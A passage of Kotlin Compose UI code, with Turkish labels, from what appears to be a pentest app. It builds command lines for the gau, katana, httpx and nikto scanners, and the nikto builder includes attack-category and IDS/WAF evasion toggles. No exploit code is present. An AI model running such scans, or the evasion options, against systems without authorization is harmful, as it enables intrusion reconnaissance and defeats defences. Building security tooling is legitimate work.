                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "Metin (-o)", "json" to "JSON (--json)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("gau")
        if (includeSubs) parts.add("--subs")
        if (filterParams) parts.add("--fp")

        val providers = mutableListOf<String>()
        if (provWayback) providers.add("wayback")
        if (provCommonCrawl) providers.add("commoncrawl")
        if (provOtx) providers.add("otx")
        if (provUrlScan) providers.add("urlscan")
        if (providers.isNotEmpty() && providers.size < 4) {
            parts.addAll(listOf("--providers", providers.joinToString(",")))
        }

        if (blacklistExt.isNotBlank()) parts.addAll(listOf("--blacklist", blacklistExt.trim()))
        if (matchCodes.isNotBlank()) parts.addAll(listOf("--mc", matchCodes.trim()))
        if (filterCodes.isNotBlank()) parts.addAll(listOf("--fc", filterCodes.trim()))
        parts.addAll(listOf("--threads", threads.trim(), "--retries", retries.trim()))
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("--proxy", proxyUrl.trim()))

        when (outputFormat) {
            "txt" -> parts.addAll(listOf("-o", "gau_urls.txt"))
            "json" -> parts.addAll(listOf("--json", "-o", "gau_urls.json"))
        }

        parts.add(domain.trim())

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 20. KATANA
@Composable
fun KatanaBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("https://target.com") }
    var depth by remember { mutableStateOf("3") }
    var concurrency by remember { mutableStateOf("20") }
    var parallelism by remember { mutableStateOf("10") }
    var rateLimit by remember { mutableStateOf("150") }
    var delay by remember { mutableStateOf("1") }
    var timeout by remember { mutableStateOf("10") }
    var crawlTimeout by remember { mutableStateOf("2h") }

    // Motor ve Ayrıştırma Stratejileri
    var jsCrawl by remember { mutableStateOf(true) }
    var headless by remember { mutableStateOf(false) }
    var knownFiles by remember { mutableStateOf(true) }
    var formFill by remember { mutableStateOf(true) }
    var automaticFormFields by remember { mutableStateOf(true) }
    var xhrExtraction by remember { mutableStateOf(true) }
    var silent by remember { mutableStateOf(false) }

    var extensionFilter by remember { mutableStateOf("css,png,jpg,svg,woff,woff2,ico") }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Hedef URL (-u) veya Liste (-list targets.txt)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "CRAWL STRATEJİLERİ VE MOTOR SEÇENEKLERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-jc JavaScript Dosyalarını ve Endpointleri Çıkar", checked = jsCrawl, onCheckedChange = { jsCrawl = it })
        ToggleOption(label = "-hl Headless Chromium Tarayıcısı Kullan (Dinamik JS)", checked = headless, onCheckedChange = { headless = it })
        ToggleOption(label = "-kf all Bilinen Dosyaları Tara (robots.txt, sitemap.xml)", checked = knownFiles, onCheckedChange = { knownFiles = it })
        ToggleOption(label = "-fx Otomatik Form Doldurma ve İstek Gönderme", checked = formFill, onCheckedChange = { formFill = it })
        ToggleOption(label = "-aff Otomatik Form Alanı Tespiti", checked = automaticFormFields, onCheckedChange = { automaticFormFields = it })
        ToggleOption(label = "-xhr Dinamik XHR / Fetch İsteklerini Yakala", checked = xhrExtraction, onCheckedChange = { xhrExtraction = it })
        ToggleOption(label = "-silent Sade Çıktı Modu", checked = silent, onCheckedChange = { silent = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "DERİNLİK VE PERFORMANS AYARLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = depth,
                onValueChange = { depth = it },
                label = { Text("Derinlik (-d)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = concurrency,
                onValueChange = { concurrency = it },
                label = { Text("Eşzamanlılık (-c)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = parallelism,
                onValueChange = { parallelism = it },
                label = { Text("Paralellik (-p)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = rateLimit,
                onValueChange = { rateLimit = it },
                label = { Text("Rate Limit (-rl)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = crawlTimeout,
                onValueChange = { crawlTimeout = it },
                label = { Text("Azami Süre (-ct)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "FİLTRELER VE PROXY", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        OutlinedTextField(
            value = extensionFilter,
            onValueChange = { extensionFilter = it },
            label = { Text("Filtrelenecek Uzantılar (-extension-filter)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "Proxy Kullan (-proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "Metin (-o)", "json" to "JSON (-json)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("katana")
        if (target.trim().endsWith(".txt")) {
            parts.addAll(listOf("-list", target.trim()))
        } else {
            parts.addAll(listOf("-u", target.trim()))
        }

        if (jsCrawl) parts.add("-jc")
        if (headless) parts.add("-hl")
        if (knownFiles) parts.addAll(listOf("-kf", "all"))
        if (formFill) parts.add("-fx")
        if (automaticFormFields) parts.add("-aff")
        if (xhrExtraction) parts.add("-xhr")
        if (silent) parts.add("-silent")

        parts.addAll(listOf("-d", depth.trim(), "-c", concurrency.trim(), "-p", parallelism.trim(), "-rl", rateLimit.trim(), "-ct", crawlTimeout.trim()))
        if (delay.isNotBlank() && delay.trim() != "0") parts.addAll(listOf("-delay", delay.trim()))
        if (timeout.isNotBlank()) parts.addAll(listOf("-timeout", timeout.trim()))
        if (extensionFilter.isNotBlank()) parts.addAll(listOf("-extension-filter", extensionFilter.trim()))
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("-proxy", proxyUrl.trim()))

        when (outputFormat) {
            "txt" -> parts.addAll(listOf("-o", "katana_endpoints.txt"))
            "json" -> parts.addAll(listOf("-json", "-o", "katana_endpoints.json"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 8. HTTPX
@Composable
fun HttpxBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("hosts.txt") }
    var customPorts by remember { mutableStateOf("") }
    var customPaths by remember { mutableStateOf("") }
    var threads by remember { mutableStateOf("50") }
    var rateLimit by remember { mutableStateOf("150") }
    var timeout by remember { mutableStateOf("10") }
    var matchCodes by remember { mutableStateOf("200,301,302") }
    var filterCodes by remember { mutableStateOf("404,500") }
    var matchString by remember { mutableStateOf("") }

    // Probing Chips
    var showTitle by remember { mutableStateOf(true) }
    var showTech by remember { mutableStateOf(true) }
    var showStatusCode by remember { mutableStateOf(true) }
    var showContentLength by remember { mutableStateOf(true) }
    var showContentType by remember { mutableStateOf(false) }
    var showServer by remember { mutableStateOf(true) }
    var showIp by remember { mutableStateOf(true) }
    var showCname by remember { mutableStateOf(false) }
    var showAsn by remember { mutableStateOf(false) }
    var showCdn by remember { mutableStateOf(true) }
    var showFavicon by remember { mutableStateOf(false) }
    var showTlsGrab by remember { mutableStateOf(false) }
    var showMethod by remember { mutableStateOf(false) }
    var showResponseTime by remember { mutableStateOf(false) }
    var showHash by remember { mutableStateOf(false) }
    var probeLive by remember { mutableStateOf(false) }

    // Seçenekler & Proxy
    var followRedirects by remember { mutableStateOf(true) }
    var silent by remember { mutableStateOf(false) }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Hedef Liste (-l hosts.txt) veya Tek URL (-u https://...)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PROBE VE TESPİT SEÇENEKLERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Title", showTitle, modifier = Modifier.weight(1f)) { showTitle = !showTitle }
            ToggleChip("Tech", showTech, modifier = Modifier.weight(1f)) { showTech = !showTech }
            ToggleChip("Status", showStatusCode, modifier = Modifier.weight(1f)) { showStatusCode = !showStatusCode }
            ToggleChip("Length", showContentLength, modifier = Modifier.weight(1f)) { showContentLength = !showContentLength }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Server", showServer, modifier = Modifier.weight(1f)) { showServer = !showServer }
            ToggleChip("IP", showIp, modifier = Modifier.weight(1f)) { showIp = !showIp }
            ToggleChip("CDN", showCdn, modifier = Modifier.weight(1f)) { showCdn = !showCdn }
            ToggleChip("CNAME", showCname, modifier = Modifier.weight(1f)) { showCname = !showCname }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("ASN", showAsn, modifier = Modifier.weight(1f)) { showAsn = !showAsn }
            ToggleChip("Favicon", showFavicon, modifier = Modifier.weight(1f)) { showFavicon = !showFavicon }
            ToggleChip("TLS Grab", showTlsGrab, modifier = Modifier.weight(1f)) { showTlsGrab = !showTlsGrab }
            ToggleChip("Method", showMethod, modifier = Modifier.weight(1f)) { showMethod = !showMethod }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Latency", showResponseTime, modifier = Modifier.weight(1f)) { showResponseTime = !showResponseTime }
            ToggleChip("MD5 Hash", showHash, modifier = Modifier.weight(1f)) { showHash = !showHash }
            ToggleChip("Content Type", showContentType, modifier = Modifier.weight(1f)) { showContentType = !showContentType }
            ToggleChip("Probe (-probe)", probeLive, modifier = Modifier.weight(1f)) { probeLive = !probeLive }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÖZEL PORTLAR VE YOLLAR", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = customPorts,
                onValueChange = { customPorts = it },
                label = { Text("Portlar (-ports 80,443,8080)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = customPaths,
                onValueChange = { customPaths = it },
                label = { Text("Yollar (-path /admin,/robots.txt)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "DURUM KODU VE İÇERİK FİLTRELERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = matchCodes,
                onValueChange = { matchCodes = it },
                label = { Text("Eşleşen Kodlar (-mc 200,301)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = filterCodes,
                onValueChange = { filterCodes = it },
                label = { Text("Filtrelenen Kodlar (-fc 404,500)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = matchString,
            onValueChange = { matchString = it },
            label = { Text("İçerikte Metin Ara (-ms 'Dashboard') - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "AĞ VE PERFORMANS", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = threads,
                onValueChange = { threads = it },
                label = { Text("Threads (-threads)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = rateLimit,
                onValueChange = { rateLimit = it },
                label = { Text("Rate (-rate-limit)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = timeout,
                onValueChange = { timeout = it },
                label = { Text("Timeout sn") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-follow-redirects HTTP Yönlendirmelerini Takip Et", checked = followRedirects, onCheckedChange = { followRedirects = it })
        ToggleOption(label = "-silent Terminalde Sadece Çıktıyı Bas", checked = silent, onCheckedChange = { silent = it })
        ToggleOption(label = "HTTP Proxy Kullan (-http-proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "Metin (.txt)", "json" to "JSON (-json)", "csv" to "CSV (-csv)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("httpx")
        if (target.trim().startsWith("http://") || target.trim().startsWith("https://")) {
            parts.addAll(listOf("-u", target.trim()))
        } else {
            parts.addAll(listOf("-l", target.trim()))
        }

        if (showTitle) parts.add("-title")
        if (showTech) parts.add("-tech-detect")
        if (showStatusCode) parts.add("-status-code")
        if (showContentLength) parts.add("-content-length")
        if (showContentType) parts.add("-content-type")
        if (showServer) parts.add("-server")
        if (showIp) parts.add("-ip")
        if (showCdn) parts.add("-cdn")
        if (showCname) parts.add("-cname")
        if (showAsn) parts.add("-asn")
        if (showFavicon) parts.add("-favicon")
        if (showTlsGrab) parts.add("-tls-grab")
        if (showMethod) parts.add("-method")
        if (showResponseTime) parts.add("-response-time")
        if (showHash) parts.addAll(listOf("-hash", "md5"))
        if (probeLive) parts.add("-probe")

        if (customPorts.isNotBlank()) parts.addAll(listOf("-ports", customPorts.trim()))
        if (customPaths.isNotBlank()) parts.addAll(listOf("-path", customPaths.trim()))
        if (matchCodes.isNotBlank()) parts.addAll(listOf("-mc", matchCodes.trim()))
        if (filterCodes.isNotBlank()) parts.addAll(listOf("-fc", filterCodes.trim()))
        if (matchString.isNotBlank()) parts.addAll(listOf("-ms", "\"${matchString.trim()}\""))

        if (followRedirects) parts.add("-follow-redirects")
        parts.addAll(listOf("-threads", threads.trim(), "-rate-limit", rateLimit.trim(), "-timeout", timeout.trim()))
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("-http-proxy", proxyUrl.trim()))
        if (silent) parts.add("-silent")

        when (outputFormat) {
            "txt" -> parts.addAll(listOf("-o", "httpx_results.txt"))
            "json" -> parts.addAll(listOf("-json", "-o", "httpx_results.json"))
            "csv" -> parts.addAll(listOf("-csv", "-o", "httpx_results.csv"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 9. NIKTO
@Composable
fun NiktoBuilder(language: AppLanguage) {
    var host by remember { mutableStateOf("10.10.10.100") }
    var port by remember { mutableStateOf("80") }
    var useSsl by remember { mutableStateOf(false) }
    var vhost by remember { mutableStateOf("") }
    var userAgent by remember { mutableStateOf("") }
    var httpAuth by remember { mutableStateOf("") }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var pauseDelay by remember { mutableStateOf("") }
    var maxTime by remember { mutableStateOf("") }
    var noInteractive by remember { mutableStateOf(true) }

    // Tuning Chips (Multi-select)
    var tuneUpload by remember { mutableStateOf(false) } // 1
    var tuneMisconfig by remember { mutableStateOf(true) } // 2
    var tuneInfoLeak by remember { mutableStateOf(true) } // 3
    var tuneInjection by remember { mutableStateOf(true) } // 4
    var tuneRemoteFile by remember { mutableStateOf(false) } // 5
    var tuneDos by remember { mutableStateOf(false) } // 6
    var tuneCommandExec by remember { mutableStateOf(true) } // 8
    var tuneSqli by remember { mutableStateOf(true) } // 9
    var tuneAuthBypass by remember { mutableStateOf(true) } // a
    var tuneSoftwareId by remember { mutableStateOf(true) } // b

    // Evasion Chips (Multi-select)
    var evadeRandomUri by remember { mutableStateOf(false) } // 1
    var evadeSelfRef by remember { mutableStateOf(false) } // 2
    var evadePrematureEnd by remember { mutableStateOf(false) } // 3
    var evadePrependLong by remember { mutableStateOf(false) } // 4
    var evadeTabSpace by remember { mutableStateOf(false) } // 6
    var evadeWindowsSlash by remember { mutableStateOf(false) } // 8

    var outputFormat by remember { mutableStateOf("htm") }
    var outputFile by remember { mutableStateOf("nikto_report") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = host,
                onValueChange = { host = it },
                label = { Text("Hedef Host (-h IP/Domain/URL)") },
                modifier = Modifier.weight(2f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = port,
                onValueChange = { port = it },
                label = { Text("Port (-p)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = vhost,
                onValueChange = { vhost = it },
                label = { Text("Sanal Host (-vhost domain.com)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = httpAuth,
                onValueChange = { httpAuth = it },
                label = { Text("HTTP Auth (-id user:pass)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = userAgent,
            onValueChange = { userAgent = it },
            label = { Text("Özel User-Agent (-useragent: opsiyonel)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "TEST KATEGORİLERİ (-Tuning)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Misconfig (2)", tuneMisconfig, modifier = Modifier.weight(1f)) { tuneMisconfig = !tuneMisconfig }
            ToggleChip("Info Leak (3)", tuneInfoLeak, modifier = Modifier.weight(1f)) { tuneInfoLeak = !tuneInfoLeak }
            ToggleChip("XSS/Inj (4)", tuneInjection, modifier = Modifier.weight(1f)) { tuneInjection = !tuneInjection }
            ToggleChip("Command (8)", tuneCommandExec, modifier = Modifier.weight(1f)) { tuneCommandExec = !tuneCommandExec }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("SQLi (9)", tuneSqli, modifier = Modifier.weight(1f)) { tuneSqli = !tuneSqli }
            ToggleChip("Auth Bypass (a)", tuneAuthBypass, modifier = Modifier.weight(1f)) { tuneAuthBypass = !tuneAuthBypass }
            ToggleChip("Software ID (b)", tuneSoftwareId, modifier = Modifier.weight(1f)) { tuneSoftwareId = !tuneSoftwareId }
            ToggleChip("Upload (1)", tuneUpload, modifier = Modifier.weight(1f)) { tuneUpload = !tuneUpload }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Remote File (5)", tuneRemoteFile, modifier = Modifier.weight(1f)) { tuneRemoteFile = !tuneRemoteFile }
            ToggleChip("DoS (6)", tuneDos, modifier = Modifier.weight(1f)) { tuneDos = !tuneDos }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "IDS / WAF ATLATMA (-evasion)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Random URI (1)", evadeRandomUri, modifier = Modifier.weight(1f)) { evadeRandomUri = !evadeRandomUri }
            ToggleChip("Self-Ref /./ (2)", evadeSelfRef, modifier = Modifier.weight(1f)) { evadeSelfRef = !evadeSelfRef }
            ToggleChip("Premature End (3)", evadePrematureEnd, modifier = Modifier.weight(1f)) { evadePrematureEnd = !evadePrematureEnd }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Prepend Garbage (4)", evadePrependLong, modifier = Modifier.weight(1f)) { evadePrependLong = !evadePrependLong }
            ToggleChip("TAB Space (6)", evadeTabSpace, modifier = Modifier.weight(1f)) { evadeTabSpace = !evadeTabSpace }
            ToggleChip("Backslash \\ (8)", evadeWindowsSlash, modifier = Modifier.weight(1f)) { evadeWindowsSlash = !evadeWindowsSlash }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "BAĞLANTI VE TARAMA SEÇENEKLERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-ssl HTTPS / SSL Bağlantısını Zorla", checked = useSsl, onCheckedChange = { useSsl = it })
        ToggleOption(label = "-nointeractive Etkileşimsiz Mod (Otomasyon için)", checked = noInteractive, onCheckedChange = { noInteractive = it })
        ToggleOption(label = "Proxy Kullan (-useproxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
